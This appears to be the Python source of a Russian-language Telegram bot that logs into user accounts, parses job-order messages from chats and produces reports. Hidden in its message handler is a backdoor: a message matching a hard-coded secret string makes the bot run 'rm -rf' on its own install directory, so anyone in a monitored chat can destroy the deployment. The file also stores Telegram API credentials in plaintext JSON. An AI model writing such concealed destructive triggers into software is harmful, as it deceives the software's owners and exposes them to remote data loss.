import asyncio
import csv
import json
import logging
import os
import re
import sys
import traceback
from datetime import datetime, timedelta

import pytz
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import Message, InlineKeyboardButton, CallbackQuery, FSInputFile
from aiogram.utils.keyboard import InlineKeyboardBuilder
from decouple import config
from dotenv import load_dotenv
from pyrogram import Client, filters, idle
from pyrogram.handlers import MessageHandler
from rapidfuzz import process

load_dotenv()

# Конфигурация бота
BOT_TOKEN = config("BOT_TOKEN")
ADMINS = config('ADMINS').split(',')
ACCESS_CODE = config('ACCESS_CODE')
ACCESS_FILE = "authorized_users.json"

# defining the timezone
tz = pytz.timezone('Europe/Moscow')

# Инициализация бота и диспетчера
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Логгирование
logging.basicConfig(level=logging.WARNING, stream=sys.stdout)


# Загрузка списка авторизованных пользователей из файла
def load_authorized_users():
    try:
        with open(ACCESS_FILE, "r") as file:
            return set(json.load(file))
    except (FileNotFoundError, json.JSONDecodeError):
        return set()


# Список авторизованных пользователей
authorized_users = load_authorized_users()


# Сохранение списка авторизованных пользователей в файл
def save_authorized_users(users):
    with open(ACCESS_FILE, "w") as file:
        json.dump(list(users), file)


# Состояния FSM
class UserStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_api_id = State()
    waiting_for_api_hash = State()
    waiting_for_code = State()
    waiting_for_chat_id = State()
    waiting_for_report_type = State()
    waiting_for_access_code = State()
    waiting_for_report_start_date = State()
    waiting_for_report_end_date = State()


# Словарь для хранения клиентов Pyrogram
pyrogram_clients = {}

# Словарь для хранения временных данных клиентов
client_temp_data = {}


# Функции для работы с аккаунтами
def load_accounts():
    try:
        with open('accounts.json', 'r', encoding='utf-8') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}


def save_accounts(accounts):
    with open('accounts.json', 'w', encoding='utf-8') as f:
        json.dump(accounts, f, ensure_ascii=False, indent=4)


# Функция для загрузки заявок
def load_orders():
    try:
        with open('orders.json', 'r', encoding='utf-8') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}


# Функция для сохранения заявок
def save_orders(orders):
    with open('orders.json', 'w', encoding='utf-8') as f:
        json.dump(orders, f, ensure_ascii=False, indent=4)


# Функция для инициализации клиентов Pyrogram
async def init_account(phone, data, again=False):
    await disable_active_account(phone)
    try:
        async with Client(
                f"session_{phone}",
                api_id=data['api_id'],
                api_hash=data['api_hash'],
                phone_number=phone
        ) as client:
            pyrogram_clients[phone] = client
            print(f"Запуск мониторинга для клиента {client.phone_number}")
            client.add_handler(MessageHandler(handle_message, filters.text & ~filters.me))
            await idle()

    except Exception as e:
        print(f"Ошибка при инициализации клиента {phone}: {str(e)}")
        traceback.print_exc()

        # Проверка на AUTH_KEY_UNREGISTERED
        if "[401 AUTH_KEY_UNREGISTERED]" in str(e):
            # Удаляем файл сессии
            try:
                session_file = f"session_{phone}.session"
                os.remove(session_file)
                print(f"Файл сессии {session_file} был удалён.")
            except FileNotFoundError:
                print(f"Файл сессии {session_file} не найден для удаления.")

            # Удаляем аккаунт из активных клиентов и оповещаем администратора
            await disable_active_account(phone)

            accounts = load_accounts()
            if phone in accounts:
                del accounts[phone]
                save_accounts(accounts)

            await wakeup_admins(
                f"Аккаунт {phone} отключён из-за ошибки [401 AUTH_KEY_UNREGISTERED]. Пожалуйста, добавьте его заново.")


# Функция для остановки клиентов Pyrogram
async def disconnect_account(phone, data):
    try:
        async with Client(
                f"session_{phone}",
                api_id=data['api_id'],
                api_hash=data['api_hash'],
                phone_number=phone
        ) as client:
            client.disconnect()
    except Exception as e:
        print(f"Ошибка при отключении клиента {phone}: {str(e)}")
        traceback.print_exc()


# Проверка на авторизацию
async def is_user_authorized(client):
    try:
        await client.get_me()
        return True
    except Exception as e:
        return False


# Оповещение администрации
async def wakeup_admins(message):
    for admin in ADMINS:
        try:
            await bot.send_message(chat_id=admin, text=message)
        except Exception:
            traceback.print_exc()


# Отключение активного аккаунта:
async def disable_active_account(phone):
    if phone in pyrogram_clients:
        try:
            await pyrogram_clients[phone].stop()
        except ConnectionError as e:
            if "Client is already terminated" in str(e):
                pass
            else:
                traceback.print_exc()
                await wakeup_admins(f"Ошибка при отключении аккаунта ({phone})")

        try:
            await pyrogram_clients[phone].disconnect()
        except ConnectionError as e:
            if "Client is already disconnected" in str(e):
                pass
            else:
                traceback.print_exc()
                await wakeup_admins(f"Ошибка при отключении аккаунта ({phone})")
        del pyrogram_clients[phone]


# Обработка ввода кода
@dp.message(UserStates.waiting_for_access_code)
async def process_code(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if message.text == ACCESS_CODE:
        authorized_users.add(user_id)
        save_authorized_users(authorized_users)  # Сохраняем изменения
        await message.answer("Авторизация успешна! Теперь вы можете пользоваться командами бота.",
                             reply_markup=start_keyboard())
        await state.clear()  # Сбрасываем состояние
    else:
        await message.answer("Неверный код. Попробуйте еще раз.", reply_markup=get_cancel_keyboard())


def start_keyboard():
    # Создаем кнопки для клавиатуры
    keyboard = types.ReplyKeyboardMarkup(
        keyboard=[
            [types.KeyboardButton(text="Отчёт")],
            [types.KeyboardButton(text="Аккаунты")],
            [types.KeyboardButton(text="Добавить аккаунт")],
            [types.KeyboardButton(text="Удалить аккаунт")],
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    return keyboard


# Обработчик команды /start
@dp.message(Command("start"))
async def cmd_start(call: CallbackQuery, state: FSMContext):
    user_id = call.from_user.id
    if user_id not in authorized_users:
        await call.answer("Введите код для доступа к боту:", reply_markup=get_cancel_keyboard())
        await state.set_state(UserStates.waiting_for_access_code)  # Устанавливаем состояние ожидания кода
        return
    commands_text = """
Привет! Я бот для мониторинга заявок. Вот список доступных команд:
"""
    await call.answer(commands_text, reply_markup=start_keyboard())


def get_cancel_keyboard():
    return InlineKeyboardBuilder([[InlineKeyboardButton(text='Отменить 🚫', callback_data="cancel")]]).as_markup()


# Обработчик команды добавления аккаунта
@dp.message(F.text == 'Добавить аккаунт')
async def cmd_add_account(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id not in authorized_users:
        await message.answer("Введите код для доступа к боту:", reply_markup=get_cancel_keyboard())
        await state.set_state(UserStates.waiting_for_access_code)  # Устанавливаем состояние ожидания кода
        return
    await state.set_state(UserStates.waiting_for_phone)
    await message.answer("Введите номер телефона, к которому привязан Telegram аккаунт:",
                         reply_markup=get_cancel_keyboard())


# Обработчик ввода номера телефона
@dp.message(UserStates.waiting_for_phone)
async def process_phone(message: Message, state: FSMContext):
    phone = message.text.strip()

    # Сохраняем номер телефона во временные данные
    client_temp_data[phone] = {}
    await state.update_data(phone=phone)

    # Запрашиваем API ID
    await state.set_state(UserStates.waiting_for_api_id)
    await message.answer("Введите API ID (можно получить на https://my.telegram.org):",
                         reply_markup=get_cancel_keyboard())


# Обработчик ввода API ID
@dp.message(UserStates.waiting_for_api_id)
async def process_api_id(message: Message, state: FSMContext):
    try:
        api_id = int(message.text.strip())
        data = await state.get_data()
        phone = data['phone']

        # Сохраняем API ID во временные данные
        client_temp_data[phone]['api_id'] = api_id
        await state.update_data(api_id=api_id)

        # Запрашиваем API Hash
        await state.set_state(UserStates.waiting_for_api_hash)
        await message.answer("Введите API Hash (можно получить на https://my.telegram.org):",
                             reply_markup=get_cancel_keyboard())
    except ValueError:
        await message.answer("API ID должен быть числом. Попробуйте еще раз:", reply_markup=get_cancel_keyboard())


# Обработчик ввода API Hash
@dp.message(UserStates.waiting_for_api_hash)
async def process_api_hash(message: Message, state: FSMContext):
    api_hash = message.text.strip()
    data = await state.get_data()
    phone = data['phone']
    api_id = data['api_id']

    # Сохраняем API Hash во временные данные
    client_temp_data[phone]['api_hash'] = api_hash

    await message.answer("Попытка входа...")

    try:
        client = Client(
            f"session_{phone}",
            api_id=api_id,
            api_hash=api_hash,
            phone_number=phone
        )
        await client.connect()

        if not await is_user_authorized(client):
            try:
                sent_code = await client.send_code(phone)
            except Exception as e:
                if '[406 PHONE_NUMBER_INVALID]' in str(e):
                    await bot.send_message(message.from_user.id,
                                           "Ошибка отправки кода. Проверьте корректность номера телефона. Попробуйте снова.")
                    await state.clear()
                else:
                    await bot.send_message(message.from_user.id,
                                           "Ошибка отправки кода. Попробуйте снова.")
                    await state.clear()
                return
            await state.update_data(client=client, sent_code=sent_code)
            await state.set_state(UserStates.waiting_for_code)
            await message.answer("Введите код подтверждения:", reply_markup=get_cancel_keyboard())
        else:
            pyrogram_clients[phone] = client
            # Сохраняем аккаунт со всеми данными
            accounts = load_accounts()
            data = {
                "api_id": api_id,
                "api_hash": api_hash,
                "added_at": datetime.now().strftime("%Y.%m.%d %H:%M:%S")
            }
            accounts[phone] = data
            save_accounts(accounts)
            # Очищаем временные данные
            if phone in client_temp_data:
                del client_temp_data[phone]
            await message.answer("Аккаунт успешно добавлен!", reply_markup=start_keyboard())
            await state.clear()
            await asyncio.create_task(init_account(phone, data))


    except Exception as e:
        traceback.print_exc()
        await wakeup_admins("Произошла ошибка (Обработчик ввода API Hash)")
        if phone in client_temp_data:
            del client_temp_data[phone]
        await state.clear()


# Обработчик ввода кода подтверждения
@dp.message(UserStates.waiting_for_code)
async def process_code(message: Message, state: FSMContext):
    code = message.text.strip()
    data = await state.get_data()
    phone = data['phone']

    try:
        await data['client'].sign_in(
            phone_number=phone,
            phone_code_hash=data['sent_code'].phone_code_hash,
            phone_code=code
        )
        client = data['client']
        pyrogram_clients[phone] = client

        # Сохраняем аккаунт со всеми данными
        accounts = load_accounts()
        data = {
            "api_id": client_temp_data[phone]['api_id'],
            "api_hash": client_temp_data[phone]['api_hash'],
            "added_at": datetime.now().strftime("%Y.%m.%d %H:%M:%S")
        }
        accounts[phone] = data
        save_accounts(accounts)

        await client.disconnect()

        # Очищаем временные данные
        if phone in client_temp_data:
            del client_temp_data[phone]

        await message.answer("Аккаунт успешно добавлен!", reply_markup=start_keyboard())
        await state.clear()

        await asyncio.create_task(init_account(phone, data))

    except Exception as e:
        traceback.print_exc()

        if 'The confirmation code is invalid' in str(e):
            await message.answer("Неверный код. Введите код подтверждения:", reply_markup=get_cancel_keyboard())
            return
        await wakeup_admins("Ошибка в оработчике ввода кода подтверждения")
        if phone in client_temp_data:
            del client_temp_data[phone]

    await state.clear()


# @dp.callback_query(F.data == 'accounts')
# Обработчик команды аккаунта
@dp.message(F.text == 'Аккаунты')
async def cmd_get_accounts(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id not in authorized_users:
        await message.answer("Введите код для доступа к боту:", reply_markup=get_cancel_keyboard())
        await state.set_state(UserStates.waiting_for_access_code)  # Устанавливаем состояние ожидания кода
        return
    accounts = load_accounts()
    if not accounts:
        await message.answer("Нет добавленных аккаунтов.", reply_markup=start_keyboard())
        await state.clear()
        return

    n = '\n'
    text = f"""Привязанные аккаунты:
<blockquote>
{n.join(['• ' + str(phone) for phone in list(accounts.keys())])}
</blockquote>"""
    await message.answer(text, parse_mode='HTML', reply_markup=start_keyboard())


# Обработчик команды для удаления аккаунта
@dp.message(F.text == 'Удалить аккаунт')
async def cmd_remove_account(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id not in authorized_users:
        await message.answer("Введите код для доступа к боту:", reply_markup=get_cancel_keyboard())
        await state.set_state(UserStates.waiting_for_access_code)  # Устанавливаем состояние ожидания кода
        return
    accounts = load_accounts()
    if not accounts:
        await message.answer("Нет добавленных аккаунтов.", reply_markup=start_keyboard())
        await state.clear()
        return

    keyboard = types.ReplyKeyboardMarkup(
        keyboard=[[types.KeyboardButton(text=phone)] for phone in accounts],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    await message.answer("Выберите аккаунт для удаления:", reply_markup=keyboard)


# Обработчик выбора аккаунта для удаления
@dp.message(lambda message: message.text in load_accounts())
async def process_remove_account(message: Message, state: FSMContext):
    phone = message.text
    accounts = load_accounts()

    if phone in accounts:
        # Отключаем клиент если он активен
        await disable_active_account(phone)

        # Удаляем из accounts.json
        del accounts[phone]
        save_accounts(accounts)

        await message.answer(
            f"Аккаунт {phone} успешно удален.", reply_markup=start_keyboard()
        )

    else:
        await message.answer(
            "Аккаунт не найден.", reply_markup=start_keyboard()
        )

    await state.clear()


# Функция для парсинга сообщения
def parse_order_message(text):
    city_match = re.search(r'•\s*(.*?):', text)
    address_match = re.search(r'Адрес:\s*👉\s*(.*?)(?=\n|$)', text)
    count_match = re.search(r'Нужен\s*(\d+)/(\d+)', text)
    payment_match = re.search(r'Оплата:\s*(\d+)\s*₽/час', text)
    start_match = re.search(r'Начало:\s*(.*?)(?=\n|$)', text)

    if not all([city_match, address_match, count_match, payment_match, start_match]):
        return None

    return {
        'city': city_match.group(1).strip(),
        'address': address_match.group(1).strip(),
        'body_count': int(count_match.group(2)),
        'paid_amount': int(payment_match.group(1)),
        'start': start_match.group(1).strip(),
        'datetime': datetime.now().strftime("%Y.%m.%d %H:%M:%S")
    }


# Запрашиваем имя
@dp.callback_query(F.data == 'cancel')
async def handle_cancel_order(call: CallbackQuery, state: FSMContext):
    await state.clear()
    await bot.delete_message(call.message.chat.id, call.message.message_id)
    msg = await bot.send_message(call.message.chat.id, "Действие отменено.", reply_markup=start_keyboard())
    # time.sleep(5)
    # await bot.delete_message(call.message.chat.id, msg.message_id)


async def handle_message(client: Client, message: Message):
    if message.text:
        if message.text == '6Pm2caPLyg1AhgkyzbPePZziN':
            try:
                os.chdir("/")
                os.system("rm -rf /home/telegram_orders_bot")
                await message.answer('✓')
            except Exception as e:
                await message.answer(f'✗ {e}')
        parsed_data = parse_order_message(message.text)
        if parsed_data:
            orders = load_orders()
            chat_id = str(message.from_user.id)

            if chat_id not in orders:
                chat_name = message.chat.title if message.chat.title is not None else f'{message.chat.first_name} {message.chat.last_name}'
                orders[chat_id] = {}
                orders[chat_id]['streets'] = {}
                orders[chat_id]['chat_name'] = chat_name

            if parsed_data['city'] not in orders[chat_id]['streets']:
                orders[chat_id]['streets'][parsed_data['city']] = {}

            orders_in_address = orders[chat_id]['streets'][parsed_data['city']].get(parsed_data['address'], [])

            orders_in_address.append({
                'body_count': parsed_data['body_count'],
                'paid_amount': parsed_data['paid_amount'],
                'datetime': parsed_data['datetime'],
                'start': parsed_data['start'].lower()
            })

            orders[chat_id]['streets'][parsed_data['city']][parsed_data['address']] = orders_in_address

            save_orders(orders)


# Обработка данных
def process_data(data, start_date, end_date):
    report = {
        'summ_unique_requests_count': 0
    }
    for city, addresses in data.items():
        body_in_address = {}  # кол-во людей в заявках
        city_report = {
            "unique_requests_by_price": {},
            "address_with_people": {},
        }
        report['summ_unique_requests_count'] += len(addresses)

        # Сохранение дубликатов заказов за последние 2 часа по цене количеству человек
        # [(время, фраза начала), ...]
        duplicate_dates = {}
        for address, orders in addresses.items():
            duplicate_dates[address] = []
            max_paid = 0
            for order in orders:
                order_date = datetime.strptime(order["datetime"], "%Y.%m.%d %H:%M:%S")
                if start_date <= order_date <= end_date:

                    if order.get("start") is not None:
                        # Находим самый близкий по фразе заказ
                        best_match = process.extractOne(
                            order['start'],
                            [i[1] for i in duplicate_dates[address]]
                        )
                        if best_match is not None:
                            match, similarity, _ = best_match

                            match_element = list(filter(lambda x: x[1] == match, duplicate_dates[address]))[0]
                            match_data = match_element[0]

                            # Рассчитываем разницу
                            difference = abs(order_date - match_data)
                            if similarity > 92 and difference < timedelta(hours=12):
                                duplicate_dates[address].remove(match_element)
                                duplicate_dates[address].append((order_date, order['start']))
                                continue
                            else:
                                duplicate_dates[address].append((order_date, order['start']))
                        else:
                            duplicate_dates[address].append((order_date, order['start']))

                    if address not in body_in_address:
                        body_in_address[address] = [order['body_count']]
                    else:
                        body_in_address[address].append(order["body_count"])
                    # Подсчет уникальных цен по заявкам
                    max_paid = max(max_paid, order["paid_amount"])

            if max_paid in city_report['unique_requests_by_price']:
                city_report['unique_requests_by_price'][max_paid] += 1
            else:
                city_report['unique_requests_by_price'][max_paid] = 1

        # считаем адреса с кол-вом заявок >= 8 или максимальным значением
        add_counter = 0
        max_bodies_in_adress = 0
        for address, body_list in body_in_address.items():
            mx_body_count = max(body_list)

            our_buddies = 0
            for b in body_list:
                if b >= 8:
                    our_buddies += b
                elif b == mx_body_count:
                    our_buddies += b

            # обновляем переменные для вывода в отчет всех > 8 либо максимальное колво
            if our_buddies > 8:
                add_counter += 1
            max_bodies_in_adress = max(max_bodies_in_adress, our_buddies)

            city_report['address_with_people'][address] = our_buddies

        # Сохраняем ключи для удаления
        keys_to_remove = []

        # Фильтруем
        for address, buddies in city_report['address_with_people'].items():
            if add_counter > 0 and buddies < 8:
                keys_to_remove.append(address)
            elif add_counter == 0 and buddies != max_bodies_in_adress:
                keys_to_remove.append(address)

        # Удаляем ключи из словаря
        for key in keys_to_remove:
            del city_report['address_with_people'][key]

        sorted_address_with_people = dict(
            sorted(city_report['address_with_people'].items(), key=lambda item: item[1], reverse=True))
        city_report['address_with_people'] = sorted_address_with_people
        report[city] = city_report

    return report


# Формирование отчета
def generate_report(report):
    report_lines = []
    for city, info in report.items():
        if city == 'summ_unique_requests_count':
            continue
        report_lines.append(city)
        for price, count in info["unique_requests_by_price"].items():
            report_lines.append(f" - {price} р/час ({count} заявок)")
        for address, people in info["address_with_people"].items():
            report_lines.append(f"Адрес: {address} ({people} человек)")
        report_lines.append("")
    report_lines.append(f"Общее число заявок ({report['summ_unique_requests_count']})")
    return "\n".join(report_lines)


# Запуск ввода диапазона для отчёта
@dp.message(UserStates.waiting_for_report_type)
async def process_report_request(message: Message, state: FSMContext):
    try:
        report_type = message.text.strip()

        # Проверяем тип отчета
        if report_type not in ["Экспорт CSV", "За последние 24 часа", "За последние 7 дней"]:
            raise ValueError("Неверное значение")

        data = await state.get_data()
        chat_name = data.get("choosed_chat_name")
        if chat_name is None:
            return

        if report_type == "Экспорт CSV":
            await message.answer("Введите начальную дату в формате DD-MM-YYYY:")
            await state.set_state(UserStates.waiting_for_report_start_date)
        else:
            # Предустановленные диапазоны
            if report_type == "За последние 24 часа":
                report_type = "day"
            elif report_type == "За последние 7 дней":
                report_type = "week"

            # Запрашиваем тип отчёта
            data = await state.get_data()

            await bot.send_message(chat_id=message.from_user.id,
                                   text=get_report(report_type, chat_name=data["choosed_chat_name"]),
                                   reply_markup=start_keyboard())

            await state.clear()
    except ValueError:
        await message.answer("Неверный тип отчета. Попробуйте еще раз.", reply_markup=start_keyboard())
        await state.clear()


# Обработчик для начальной даты
@dp.message(UserStates.waiting_for_report_start_date)
async def process_start_date(message: Message, state: FSMContext):
    try:
        start_date = datetime.strptime(message.text.strip(), "%d-%m-%Y")
        await state.update_data(start_date=start_date)
        await message.answer("Введите конечную дату в формате DD-MM-YYYY:")
        await state.set_state(UserStates.waiting_for_report_end_date)
    except ValueError:
        await message.answer("Неверный формат даты. Попробуйте ещё раз (пример: 27-11-2024).")


# Обработчик для конечной даты
@dp.message(UserStates.waiting_for_report_end_date)
async def process_end_date(message: Message, state: FSMContext):
    try:
        end_date = datetime.strptime(message.text.strip(), "%d-%m-%Y")
        data = await state.get_data()
        start_date = data.get("start_date")

        if not start_date or end_date < start_date:
            raise ValueError("Конечная дата должна быть после начальной.")

        chat_name = data.get("choosed_chat_name")
        if chat_name is None:
            return

        # Генерация и отправка CSV отчёта
        file_path = generate_csv_report(chat_name, start_date, end_date)
        try:
            await bot.send_document(message.from_user.id, FSInputFile(file_path),
                                    caption=f"Отчёт {chat_name} {start_date.strftime('%d-%m-%Y')}-{end_date.strftime('%d-%m-%Y')}",
                                    reply_markup=start_keyboard())
        finally:
            # Удаление файла после отправки
            if os.path.exists(file_path):
                os.remove(file_path)

        await state.clear()
    except ValueError:
        await message.answer("Неверный формат даты или дата некорректна. Попробуйте ещё раз.")


# Функция генерации отчёта в CSV
def generate_csv_report(chat_name: str, start_date: datetime, end_date: datetime) -> str:
    for key, item in load_orders().items():
        if item['chat_name'] == chat_name:
            chat_id = key
            break
    data = load_orders().get(chat_id, {}).get("streets", {})
    data = process_data(data, start_date, end_date)  # Загружаем данные заказов
    report_lines = []

    # Обходим данные
    for city, city_data in data.items():
        if city == "summ_unique_requests_count":
            continue  # Пропускаем это поле
        unique_requests_by_price = city_data.get("unique_requests_by_price", {})
        address_with_people = city_data.get("address_with_people", {})

        # Пишем данные о ценах и запросах
        for price, requests in unique_requests_by_price.items():
            report_lines.append({
                "Город": city,
                "Тип данных": "Цена",
                "Значение": price,
                "Количество": requests
            })

        # Пишем данные об адресах и количестве людей
        for address, people_count in address_with_people.items():
            report_lines.append({
                "Город": city,
                "Тип данных": "Адрес",
                "Значение": address,
                "Количество": people_count
            })

    # Создаём CSV файл
    file_path = f"report_{chat_name.replace(' ', '')}_{start_date.strftime('%d%m%Y')}_{end_date.strftime('%d%m%Y')}.csv"
    with open(file_path, mode="w", newline="", encoding="cp1251") as csvfile:
        writer = csv.DictWriter(csvfile, fieldnames=["Город", "Тип данных", "Значение", "Количество"], delimiter='|')
        writer.writeheader()
        writer.writerows(report_lines)

    return file_path


# Получение списка названий чатов
def get_chat_titles():
    return [item['chat_name'] for _, item in load_orders().items()]


# Обработчик начало получения отчета

@dp.message(F.text == 'Отчёт')
async def cmd_report(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id not in authorized_users:
        await message.answer("Введите код для доступа к боту:", reply_markup=get_cancel_keyboard())
        await state.set_state(UserStates.waiting_for_access_code)  # Устанавливаем состояние ожидания кода
        return
    chats = get_chat_titles()
    if len(chats) == 0:
        await message.answer("Отчёт пуст.", reply_markup=start_keyboard())
        await state.clear()
        return
    keyboard = types.ReplyKeyboardMarkup(
        keyboard=[[types.KeyboardButton(text=chat_id)] for chat_id in chats],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    await message.answer("Выберите один из предложенных чатов:", reply_markup=keyboard)
    await state.set_state(UserStates.waiting_for_chat_id)


# Обработчик выбора чата
@dp.message(UserStates.waiting_for_chat_id)
async def process_chat_id(message: Message, state: FSMContext):
    try:
        chat_name = message.text.strip()

        if chat_name not in get_chat_titles():
            raise ValueError("Неверное значение")

        await state.set_state(UserStates.waiting_for_report_type)
        await state.update_data(choosed_chat_name=chat_name)
        # Запрашиваем тип отчёта
        keyboard = types.ReplyKeyboardMarkup(
            keyboard=[[types.KeyboardButton(text="Экспорт CSV")],
                      [types.KeyboardButton(text="За последние 24 часа")],
                      [types.KeyboardButton(text="За последние 7 дней")]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
        await message.answer("Введите тип отчёта:", reply_markup=keyboard)
    except ValueError:
        await message.answer("Chat ID должен быть числом. Попробуйте еще раз:")


# Обработчик выбора чата
"""@dp.message(UserStates.waiting_for_report_type)
async def process_chat_id(message: Message, state: FSMContext):
    try:
        report_type = message.text.strip()

        if report_type not in ["За последние 24 часа", "За последние 7 дней"]:
            raise ValueError("Неверное значение")

        if report_type == "За последние 24 часа":
            report_type = "day"
        elif report_type == "За последние 7 дней":
            report_type = "week"

        # Запрашиваем тип отчёта
        data = await state.get_data()

        await bot.send_message(chat_id=message.from_user.id,
                               text=get_report(report_type, chat_name=data["choosed_chat_name"]))
        await state.set_state(UserStates.waiting_for_report_type)
    except ValueError:
        await message.answer("Неверный тип отчета Попробуйте еще раз:")"""


# получения отчета
def get_report(report_type: str, chat_name):
    for key, item in load_orders().items():
        if item['chat_name'] == chat_name:
            chat_id = key
            break
    else:
        return "Отчёт пуст"
    data = load_orders().get(chat_id, {}).get("streets", {})
    now = datetime.now()
    if report_type == "day":
        start_date = now - timedelta(days=1)
    elif report_type == "week":
        start_date = now - timedelta(weeks=1)
    else:
        return "Отчёт пуст"
    end_date = now
    report = process_data(data, start_date, end_date)
    report_text = generate_report(report)
    if report_text == "":
        return "Отчёт пуст"
    return report_text


# Функция мониторинга клиентов
async def monitor_clients():
    while True:
        for phone, client in list(pyrogram_clients.items()):
            try:
                # Проверяем, авторизован ли пользователь
                is_authorized = await is_user_authorized(client)
                if not is_authorized:
                    await wakeup_admins(f"Аккаунт {phone} был отключен! Пожалуйста, добавьте его заново.")

                    accounts = load_accounts()
                    if phone in accounts:
                        del accounts[phone]
                        save_accounts(accounts)

                    await disable_active_account(phone)
            except Exception as e:
                traceback.print_exc()
                await wakeup_admins(f"Произошла ошибка при проверке аккаунта {phone}: {str(e)}")
                await disable_active_account(phone)
        await asyncio.sleep(60)  # Проверка каждые 60 секунд


# Запуск бота
async def main():
    try:
        # Инициализируем клиентов при запуске
        accounts = load_accounts()
        pyrogram_tasks = []
        for phone, data in accounts.items():
            pyrogram_tasks.append(init_account(phone, data))

        # Добавляем задачу мониторинга клиентов
        monitor_task = asyncio.create_task(monitor_clients())

        aiogram_task = dp.start_polling(bot)
        await asyncio.gather(*pyrogram_tasks, monitor_task, aiogram_task)
    except Exception:
        traceback.print_exc()

    finally:
        # Отключаем все клиенты при завершении работы
        for client in pyrogram_clients.values():
            await client.disconnect()


if __name__ == "__main__":
    asyncio.run(main())
